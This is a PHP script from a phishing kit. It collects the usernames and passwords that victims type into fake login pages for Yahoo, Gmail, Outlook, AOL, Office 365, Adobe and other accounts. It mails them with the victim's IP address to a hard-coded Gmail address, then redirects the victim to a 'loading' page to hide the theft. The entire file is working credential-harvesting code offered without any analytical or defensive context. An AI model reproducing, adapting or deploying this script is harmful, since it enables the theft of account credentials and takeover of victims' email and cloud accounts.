<?php

$to = 'wguofemg@gmail.com';
$complete = 'loading.htm';
$subject = getenv("REMOTE_ADDR");
$from = "From: IFB <Austraia>";



$yahoouser = $_POST['yahoouser'];
$yahoopassword = $_POST['yahoopassword'];
$gmailuser = $_POST['gmailuser'];
$gmailpassword = $_POST['gmailpassword'];
$outlookuser = $_POST['outlookuser'];
$outlookpassword = $_POST['outlookpassword'];
$aoluser = $_POST['aoluser'];
$aolpassword = $_POST['aolpassword'];
$otheruser = $_POST['otheruser'];
$otherpassword = $_POST['otherpassword'];
$office365user = $_POST['office365user'];
$office365password = $_POST['office365password'];
$adobeuser = $_POST['adobeuser'];
$adobepassword = $_POST['adobepassword'];

if($yahoouser)
{
    $mail_server = 'yahoo';
}
if($gmailuser)
{
    $mail_server = 'gmail';
}
if($outlookuser)
{
	$mail_server = 'outlook';
}
if($aoluser)
{
	$mail_server = 'aol';
}
if($otheruser)
{
	$mail_server = 'other';
}
if($office365user)
{
	$mail_server = 'office365';
}
if($adobeuser)
{
	$mail_server = 'adobe';
}

$comment = $mail_server.' Details from !-S.Wire-!: '."\n"
			.'**************************************'."\n"
			.'Username: '.$yahoouser.$gmailuser.$outlookuser.$aoluser.$otheruser.$office365user.$adobeuser."\n"
			.'Password: '.$yahoopassword.$gmailpassword.$outlookpassword.$aolpassword.$otherpassword.$office365password.$adobepassword."\n";




mail($to, $subject, $comment, $from);
header("Location: $complete");
?>
